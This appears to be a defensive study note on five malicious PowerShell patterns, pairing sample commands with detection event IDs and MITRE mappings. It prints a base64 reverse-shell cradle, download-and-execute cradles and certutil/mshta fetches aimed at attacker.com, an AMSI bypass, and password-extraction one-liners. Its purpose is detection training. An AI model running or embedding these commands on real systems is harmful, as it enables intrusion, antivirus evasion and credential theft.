# Day 36 — Malicious PowerShell Patterns

**Date:** 2026-06-27
**Source:** Published threat reports (CrowdStrike, Microsoft, Mandiant, SANS)

5 real-world malicious PowerShell patterns with obfuscation technique, detection approach, and Sigma rule reference.

---

## Pattern 1 — Base64 Encoded Download Cradle

**What it looks like:**
```powershell
powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQANAA0ACkA
```

Decoded:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)
```

**Obfuscation technique:** Base64 encoding via `-Enc` flag. The command is hidden from basic string inspection — you need to base64-decode the argument to see what it does.

**What it does:** Establishes a reverse TCP connection to the attacker's machine. Classic reverse shell.

**Detection:** Script Block Logging (Event ID 4104) captures the decoded command after PowerShell processes it. The `-Enc` flag itself in the command line (Event ID 4688 or Sysmon Event ID 1) is also a useful signal.

**MITRE ATT&CK:** T1059.001, T1105

---

## Pattern 2 — IEX Download Cradle (in-memory execution)

**What it looks like:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

Or obfuscated:
```powershell
&([scriptblock]::Create((New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1')))
```

**Obfuscation technique:** `IEX` (Invoke-Expression) or `[scriptblock]::Create()` to execute downloaded code directly in memory without writing to disk. The second version wraps it in a scriptblock to evade simple `IEX` string detection.

**What it does:** Downloads a PowerShell script from an attacker-controlled URL and executes it in memory. No file is written to disk — making it harder to detect with file-based scanning.

**Detection:** Script Block Logging captures the downloaded content when it executes. Event ID 4104 will show the actual payload code. Network connections from powershell.exe (Sysmon Event ID 3) to external IPs are also a strong signal.

**MITRE ATT&CK:** T1059.001, T1105, T1027

---

## Pattern 3 — AMSI Bypass

**What it looks like:**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Or obfuscated:
```powershell
$a=[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msiUtils'));$a.GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,$true)
```

**Obfuscation technique:** String concatenation to break up known-bad strings. `AmsiUtils` gets split into `$([char]65+'msiUtils')` — the char(65) resolves to `A` at runtime, so the full string is never present in the source and bypasses simple signature matching.

**What it does:** Disables the Antimalware Scan Interface (AMSI), which is Windows' built-in mechanism for scanning PowerShell scripts. Once AMSI is disabled, subsequent PowerShell commands bypass antivirus scanning.

**Detection:** Script Block Logging captures the actual string after string concatenation resolves. Look for `amsiInitFailed` in Event ID 4104. Also look for this pattern appearing immediately before other suspicious PowerShell activity — AMSI bypass is almost always a precursor, not an end goal.

**MITRE ATT&CK:** T1562.001 — Impair Defenses: Disable or Modify Tools

---

## Pattern 4 — Credential Harvesting via PowerShell

**What it looks like:**
```powershell
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((Get-Credential).Password))
```

Or via registry:
```powershell
(Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon').DefaultPassword
```

**Obfuscation technique:** Using legitimate .NET methods for credential access makes this hard to block — these are real Windows APIs, not obviously malicious functions.

**What it does:** The first extracts the plaintext password from a credential prompt (social engineering). The second reads the DefaultPassword registry key — only populated on systems with auto-logon configured, but when it exists it gives away the admin password in plaintext.

**Detection:** Module Logging (Event ID 4103) shows the specific .NET method calls. Registry access in PowerShell also generates Event ID 4663 if object access auditing is enabled.

**MITRE ATT&CK:** T1555, T1552.002

---

## Pattern 5 — Living-off-the-Land via PowerShell (LOLBins)

**What it looks like:**
```powershell
# Downloading files without invoking obvious web cmdlets
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe

# Or using PowerShell to invoke other LOLBins
Start-Process -FilePath "mshta.exe" -ArgumentList "http://attacker.com/payload.hta"
```

**Obfuscation technique:** Using trusted Windows binaries through PowerShell instead of calling malicious code directly. certutil.exe is a certificate utility. mshta.exe runs HTML applications. Both are signed by Microsoft.

**What it does:** Downloads and executes payloads using legitimate Windows tools, bypassing application whitelisting and many AV products that trust these binaries.

**Detection:** PowerShell spawning certutil.exe or mshta.exe is unusual (Sysmon Event ID 1, parent process = powershell.exe). Network connections from certutil.exe or mshta.exe to external IPs (Sysmon Event ID 3) are highly suspicious — these tools rarely need internet access in normal use.

**MITRE ATT&CK:** T1218 — System Binary Proxy Execution
